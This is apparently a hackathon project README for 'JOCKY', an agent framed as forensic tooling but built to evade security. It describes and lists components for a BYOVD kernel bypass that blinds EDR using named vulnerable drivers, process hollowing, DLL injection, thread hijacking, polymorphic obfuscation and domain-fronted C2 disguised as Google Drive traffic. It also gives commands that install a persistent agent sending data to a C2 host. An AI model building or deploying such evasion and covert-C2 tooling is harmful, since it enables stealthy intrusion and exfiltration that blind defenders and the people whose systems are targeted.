# JOCKY — Next-Generation Forensic Intelligence Framework

> **SIH 2025 · Problem ID 26148 · NTRO · Category: Blockchain & Cybersecurity**

```
  JOCKY is not a tool that evades security.
  It is a language that was never visible to security in the first place.
```

---

## What Is JOCKY?

JOCKY is a **purpose-built forensic intelligence framework** developed for the National Technical Research Organisation (NTRO) as a solution to SIH 2025 Problem ID 26148. It enables covert forensic evidence collection from live, compromised Windows systems — without triggering the endpoint detection and response (EDR) software protecting those systems.

### The Core Problem

Digital forensic investigators face a fundamental paradox:

- The tools they need to analyze a compromised system are **blocked by the security software** on that system.
- Commercial forensic tools (EnCase, FTK) are immediately detected and halted.
- Offensive frameworks (Metasploit, Cobalt Strike) are built to attack — not to collect court-admissible evidence.
- No existing tool is simultaneously: **evasive + forensic-grade + court-admissible + multi-target**.

### JOCKY's Solution

JOCKY approaches the problem **from the compiler layer down to the kernel**:

1. **Custom programming language** — `.jky` scripts compile to polymorphic native binaries; no two deployments share a signature
2. **Kernel-level EDR bypass** — BYOVD engine removes EDR callbacks *before* evidence collection begins
3. **Covert C2 channel** — all communication disguised as Google Drive API traffic over TLS 1.3 / Cloudflare CDN
4. **Court-admissible evidence** — every byte is SHA-256 chained and Ed25519-signed on a forensic blockchain

---

## Architecture Overview

```
┌─────────────────────────────────────────────────────────────────┐
│                     INVESTIGATOR SIDE                           │
│                                                                 │
│  JOCKY IDE → Compiler → Polymorphic Engine → Integrity Engine  │
│     (.jky)    (LLVM IR)   (AES/XOR/CFG)      (Ed25519 chain)  │
│                                                                 │
│  Management Dashboard (http://127.0.0.1:8000)                  │
│  ├── Agent Controller (asyncio, multi-agent)                   │
│  ├── Blockchain COC Explorer                                    │
│  └── Live Evidence Stream (SSE)                                │
└────────────────────────────┬────────────────────────────────────┘
                             │
                  TLS 1.3 + Domain Fronting
                  SNI: cdnjs.cloudflare.com
                  Host: c2.example.com
                  Content: Google Drive API v3
                             │
┌────────────────────────────┴────────────────────────────────────┐
│                      TARGET SIDE                                │
│                                                                 │
│  JOCKY Agent (jocky_agent.exe)                                 │
│  ├── Phase 1: BYOVD → Remove EDR kernel callbacks              │
│  ├── Phase 2: Forensic Collection (8 collectors)               │
│  │   ├── proc_list     (processes + SHA-256 of executables)    │
│  │   ├── net_state     (TCP/UDP + process mapping)             │
│  │   ├── reg_persistence (autorun keys + suspicion flags)      │
│  │   ├── event_log     (Security/System: 4624, 4688, 7045…)    │
│  │   ├── usb_history   (USBSTOR registry)                      │
│  │   ├── prefetch      (execution history from .pf files)      │
│  │   ├── browser_hist  (Chrome/Edge SQLite history + downloads) │
│  │   └── scheduled_tasks (SYSTEM-run tasks, shell interpreters)│
│  └── Phase 3: AES-256-GCM encrypt → POST to C2                │
└─────────────────────────────────────────────────────────────────┘
```

---

## Quick Start

### Prerequisites

```powershell
# Windows 11 x64, Python 3.12, Clang (for C components)
cd D:\path\to\JOCKY
.\.venv\Scripts\Activate.ps1
pip install fastapi uvicorn cryptography pyinstaller --break-system-packages
```

### Option A — Same-Machine Demo (SIH presentation)

```powershell
# Terminal 1: start C2 server + dashboard
python server/c2_server.py --host 0.0.0.0 --port 8000

# Terminal 2: start agent (collects from THIS machine)
python agent/main.py --c2 http://127.0.0.1:8000 --interval 60

# Open browser: http://127.0.0.1:8000
# Evidence appears in real time within 30 seconds
```

### Option B — Real Target Investigation

```powershell
# Step 1: build standalone .exe on investigator machine
.\build_agent.bat
# Output: dist\jocky_agent.exe

# Step 2: start C2 server
python server/c2_server.py --host 0.0.0.0 --port 8000

# Step 3: on TARGET machine (run as Admin)
jocky_agent.exe --c2 http://<INVESTIGATOR_IP>:8000 --interval 60

# Step 4: install as persistent Windows service on target
install_service.bat http://<INVESTIGATOR_IP>:8000
```

### Option C — Full .jky Script Pipeline

```powershell
# compile a .jky forensic script
python main.py compile language/grammar/example_scripts/ransomware_triage.jky --obfuscate

# run locally
python main.py run language/grammar/example_scripts/ransomware_triage.jky

# verify evidence integrity chain
python main.py verify evidence/chain.json
```

---

## Project Structure

```
JOCKY/
│
├── agent/                         # Deployed on target machine
│   ├── main.py                    # Agent entry point + AES-256-GCM send loop
│   └── collector.py               # 8 real forensic collectors (stdlib only)
│
├── server/
│   └── c2_server.py               # C2 receiver: decrypt + blockchain + SSE
│
├── language/                      # JOCKY compiler (Phases 1–5)
│   ├── grammar/
│   │   ├── JOCKY.lark             # BNF grammar definition
│   │   ├── validation_rules.md    # Semantic constraint documentation
│   │   └── example_scripts/       # .jky example forensic scripts
│   ├── lexer_parser/
│   │   ├── lexer.py               # Tokenizer
│   │   ├── parser.py              # Lark parse tree builder
│   │   ├── ast_nodes.py           # AST node definitions
│   │   ├── validator.py           # Semantic validation
│   │   └── interpreter.py         # Tree-walk interpreter (fallback)
│   └── llvm_frontend/
│       ├── ir_generator.py        # AST → LLVM IR
│       └── cf_obfuscator.py       # CFG obfuscation (opaque predicates)
│
├── build_pipeline/                # Polymorphic engine (Phase 6)
│   └── obfuscator/
│       ├── string_encryptor.py    # AES-256 string encryption
│       └── var_renamer.py         # XOR variable scrambling + import mutation
│
├── execution_engine/              # Stealth execution (Phases 7–12)
│   ├── direct_syscalls/
│   │   ├── syscall_stubs.asm      # NASM direct syscall stubs (bypasses NTDLL hooks)
│   │   └── syscall_stubs.h
│   ├── syscall_gate/
│   │   ├── syscall_gate.c         # SSN resolution + gate dispatch
│   │   └── syscall_gate.h
│   ├── api_unhooker/
│   │   ├── unhook.c               # Userland hook removal
│   │   └── unhook.h
│   ├── ntdll_unhook/
│   │   ├── ntdll_unhook.c         # Clean NTDLL remap from disk
│   │   └── ntdll_unhook.h
│   ├── process_hollowing/
│   │   ├── hollow.c               # PE hollowing
│   │   └── hollow.h
│   ├── reflective_loader/
│   │   ├── reflective_loader.c    # Reflective DLL injection
│   │   ├── inject.c               # Injector harness
│   │   └── rdll_loader/           # RDLL bootstrap
│   ├── thread_hijacker/
│   │   ├── hijack.c               # APC + context hijacking
│   │   └── hijack.h
│   └── forensics/                 # C-layer forensic primitives
│       ├── mem_acquire.c/h        # Memory acquisition
│       ├── proc_analysis.c/h      # Process analysis
│       ├── net_state.c/h          # Network state capture
│       ├── fs_analysis.c/h        # Filesystem analysis
│       └── reg_walk.c/h           # Registry walk
│
├── byovd/                         # Kernel EDR bypass (Phase 13)
│   └── kernel_subverter/
│       ├── byovd_interface.h      # Driver-agnostic vtable contract
│       ├── byovd.h                # Master header
│       ├── byovd.c                # Orchestrator (backend-agnostic)
│       ├── backend_rtcore64.c     # RTCore64.sys backend (MSI Afterburner)
│       ├── backend_winring0x64.c  # WinRing0x64.sys backend (OpenLibSys)
│       ├── backend_asrdrv107.c    # AsrDrv107.sys backend (ASRock)
│       ├── callback_scrubber.c    # PspCreateProcessNotifyRoutine zeroing
│       └── jocky_byovd_main.c     # CLI entry point
│
├── transport/                     # Covert C2 channel (Phases 14–15)
│   ├── domain_fronting.py         # TLS 1.3 + Cloudflare CDN domain fronting
│   ├── cloud_api_wrapper.py       # Google Drive API camouflage + AES-256-GCM
│   ├── cdn_router.py              # Circuit breaker + exponential backoff
│   └── test_phase14.py            # Offline unit tests (7/7 passing)
│
├── management_interface/          # Investigator interface (Phases 16–17)
│   ├── agent_controller.py        # Asyncio multi-agent orchestrator
│   └── dashboard/
│       ├── api.py                 # FastAPI REST + SSE endpoints
│       └── index.html             # Live React dashboard (Chart.js)
│
├── integrity/                     # Evidence integrity (Phase 17)
│   ├── hash_chain.py              # SHA-256 chained evidence log
│   ├── signing.py                 # Ed25519 signing
│   ├── verifier.py                # Standalone verification tool
│   └── blockchain.py              # Forensic blockchain (Chain of Custody)
│
├── forensic_primitives/           # Python-layer forensic wrappers
│   ├── memory_acquisition.py
│   ├── process_analysis.py
│   ├── network_capture.py
│   ├── filesystem_analysis.py
│   └── registry_inspection.py
│
├── evidence/                      # Generated: evidence bundles + chains
│   ├── blockchain_NTRO-2025-001.json
│   ├── chain_<agent_id>.json
│   └── evidence_<agent_id>_<seq>.json
│
├── main.py                        # CLI: compile / run / verify / dashboard
├── build_agent.bat                # Package agent into standalone .exe
├── install_service.bat            # Install agent as Windows service on target
└── README.md                      # This file
```

---

## The Four USPs

### 1. Custom Programming Language

JOCKY is built on a **purpose-built compiled language** — not a scripting layer, not PowerShell, not Python. Investigators write `.jky` scripts in a domain-specific language designed for forensic operations. The compiler pipeline:

```
.jky script
    ↓  Lark BNF grammar (Phase 2)
Parse Tree
    ↓  AST construction (Phase 3)
AST
    ↓  LLVM IR generation (Phase 4)
LLVM IR
    ↓  CFG obfuscation — opaque predicates, junk blocks (Phase 5)
Obfuscated IR
    ↓  Clang → native PE/ELF (Phase 6a)
Binary
    ↓  AES-256 string encrypt, XOR var scramble, import mutation (Phase 6b)
Polymorphic Binary
```

Every build produces a **unique binary** with a unique hash. VirusTotal signature databases are permanently useless against it.

### 2. Kernel-Level EDR Bypass (BYOVD)

Before any evidence is collected, JOCKY blinds the EDR:

```c
// The abstraction layer: any driver, same interface
byovd_backend_t *backend = rtcore64_backend_init("RTCore64.sys");
byovd_engine_init(BYOVD_BACKEND_RTCORE64, path);
scrub_edr_callbacks(backend);   // zeros PspCreateProcessNotifyRoutine
// EDR is now deaf to all process creation events
```

The BYOVD engine is **driver-agnostic**: it abstracts any vulnerable signed driver behind a unified `read/write` interface. Swapping to a new driver requires changing one enum constant. Three backends are implemented: RTCore64 (MSI Afterburner), WinRing0x64 (OpenLibSys), AsrDrv107 (ASRock).

### 3. Covert C2 Channel

All C2 traffic is **indistinguishable from Google Drive API calls**:

| Layer | What the network sees | What it actually is |
|---|---|---|
| TCP destination | Cloudflare anycast IP | Cloudflare CDN edge |
| TLS SNI | cdnjs.cloudflare.com | Legitimate CDN domain |
| HTTP Host header | c2.example.com | Actual C2 origin |
| HTTP path | /drive/v3/files/{uuid} | Agent check-in |
| Body | JSON with "content" field | AES-256-GCM ciphertext |
| Key | HKDF-SHA256(PSK, agent_id) | Per-agent derived key |

A SOC analyst watching the wire sees a Windows machine syncing documents to Google Drive.

### 4. Court-Admissible Evidence — Forensic Blockchain

Every piece of evidence is immediately anchored to a **cryptographically linked blockchain**:

```
Block 0 (INVESTIGATION_START)
  hash: a443c12ae812...
  sig:  Ed25519(investigator_key, hash)
       ↓
Block 1 (AGENT_DEPLOYED)       prev_hash = a443c12ae812...
  hash: b281f03c9d44...
  sig:  Ed25519(investigator_key, hash)
       ↓
Block 2 (EVIDENCE_COLLECTED)   prev_hash = b281f03c9d44...
  data: {proc_list, net_state, suspicious: ["mimikatz.exe"]}
  hash: c394e15a7f21...
  sig:  Ed25519(investigator_key, hash)
```

Tampering with any block breaks its hash. Tampering breaks every subsequent block's `prev_hash`. Tampering breaks the Ed25519 signature. The chain either holds or it doesn't.

---

## Forensic Collectors

The agent runs 8 real collectors on the target machine:

| Collector | What It Captures | Threat Indicators |
|---|---|---|
| `proc_list` | All processes, SHA-256 of executables, command lines | Processes with no disk image (injection), suspicious paths |
| `net_state` | All TCP/UDP connections mapped to processes | External IPs, known bad IP ranges |
| `reg_persistence` | All autorun registry keys | powershell, mshta, certutil, base64 in values |
| `event_log` | Security + System events | 4624 logons, 4688 process creates, 7045 service installs |
| `usb_history` | USBSTOR registry (all connected USB devices) | — |
| `prefetch` | Binary .pf file parsing → execution timeline | mimikatz, psexec, wce, fgdump in prefetch |
| `browser_hist` | Chrome + Edge SQLite history + downloads | — |
| `scheduled_tasks` | All scheduled tasks with flags | SYSTEM-run tasks with shell interpreters |

All collection output is:
1. AES-256-GCM encrypted with a per-agent HKDF-derived key
2. Transmitted to C2 with an unencrypted summary for dashboard quickview
3. Decrypted and logged at C2
4. Appended to the forensic blockchain as `EVIDENCE_COLLECTED` block
5. Fired as SSE event to the live dashboard

---

## Chain of Custody Verification

```powershell
# verify the blockchain from investigator machine
Invoke-RestMethod http://127.0.0.1:8000/coc/verify | Select-Object -ExpandProperty report
```

```
================================================================
JOCKY Forensic Blockchain -- Chain of Custody Verification
================================================================
Case:        NTRO-2025-001
Investigator:INV-ALPHA
Blocks:      12
Key:         a1b2c3d4e5f6789abc12...
----------------------------------------------------------------
  ✓ [Block  0] 2026-09-25T18:30:00  INVESTIGATION_START    a443c12ae812
  ✓ [Block  1] 2026-09-25T18:30:00  AGENT_DEPLOYED         b281f03c9d44
  ✓ [Block  2] 2026-09-25T18:31:05  EVIDENCE_COLLECTED     c394e15a7f21
  ✓ [Block  3] 2026-09-25T18:31:05  ANOMALY_DETECTED       d402f16b8e32
  ✓ [Block  4] 2026-09-25T18:32:10  EVIDENCE_COLLECTED     e513012c9f43
  ...
----------------------------------------------------------------
RESULT: CHAIN INTACT -- all blocks verified
================================================================
```

---

## Comparison With Existing Tools

| Capability | EnCase / FTK | Metasploit | JOCKY |
|---|---|---|---|
| Custom language | ✗ | ✗ | **✓** |
| Polymorphic output | ✗ | ✗ | **✓** |
| Kernel EDR bypass | ✗ | Partial | **✓** |
| Court-admissible log | ✓ | ✗ | **✓** |
| Blockchain COC | ✗ | ✗ | **✓** |
| Covert C2 channel | ✗ | ✓ | **✓** |
| Multi-target | Partial | ✓ | **✓** |
| Forensic + evasive | ✗ | ✗ | **✓ Only one** |

---

## Phase Build Status

| Phase | Component | Status |
|---|---|---|
| 1–3 | Grammar + Lexer + Parser + AST | ✅ Complete |
| 4–5 | LLVM IR codegen + CFG obfuscation | ✅ Complete |
| 6 | Polymorphic engine (AES-256 + XOR + import mutation) | ✅ Complete |
| 7 | Direct syscalls (NASM stubs, SSN resolution) | ✅ Complete |
| 8 | API unhooking + NTDLL clean remap | ✅ Complete |
| 9 | Process hollowing | ✅ Complete |
| 10 | Reflective DLL injection | ✅ Complete |
| 11 | Thread hijacking (APC + context) | ✅ Complete |
| 12 | Forensic primitives (C + Python layer) | ✅ Complete |
| 13 | BYOVD abstraction layer (3 backends) | ✅ Complete |
| 14 | TLS 1.3 + domain fronting + Drive API camouflage | ✅ Complete (7/7 tests) |
| 15 | CDN router + circuit breaker | ✅ Complete |
| 16 | Multi-agent asyncio controller | ✅ Complete (smoke test passed) |
| 17 | FastAPI dashboard + blockchain COC | ✅ Complete (verified=true) |
| Agent | 8 real forensic collectors + AES-256-GCM send loop | ✅ Complete |
| Server | C2 receiver + real evidence pipeline | ✅ Complete |

---

## Live Dashboard

Once `python server/c2_server.py` is running, open `http://127.0.0.1:8000`:

- **Agent Status table** — real-time state of all deployed agents (CONNECTED / COLLECTING / LOST)
- **Live Evidence Stream** — SSE-powered feed showing every collection event as it arrives
- **Blockchain Explorer** — every block with hash, event type, timestamp, linkage
- **Evidence by Type** — doughnut chart of collector distribution
- **Chain Integrity** — one-click full blockchain verification with detailed report
- **Seed Demo** — populate with synthetic data for SIH presentation

---

## Dependencies

```
Python 3.12+
  fastapi           REST API framework
  uvicorn           ASGI server
  cryptography      AES-256-GCM, Ed25519
  lark              BNF grammar parser
  pefile            PE import table manipulation
  pywin32           Windows event log access (agent)
  pyinstaller       Package agent to .exe

Clang (Windows)     Compile LLVM IR → native binary
NASM                Assemble direct syscall stubs
```

---

## For NTRO Judges

JOCKY is designed for the exact scenario described in Problem ID 26148: **an investigator who needs to collect forensic evidence from a live compromised system without alerting the threat actor or triggering the system's own security software.**

The investigation flow:

1. Investigator starts C2 server on their machine
2. Agent `.exe` is installed on the target (physical access or legitimate remote path)
3. Agent installs as a Windows service, starts collection immediately
4. Every 60 seconds: 8 collectors run → data encrypted → POSTed to C2
5. C2 decrypts → appends blockchain → fires SSE to investigator's browser
6. Investigator sees real-time evidence: processes, connections, persistence, USB history
7. Every collection is Ed25519-signed on the blockchain
8. Investigator runs `coc/verify` → court-admissible chain of custody report

**One investigator. Multiple simultaneous targets. Every byte signed. Zero operational signature.**
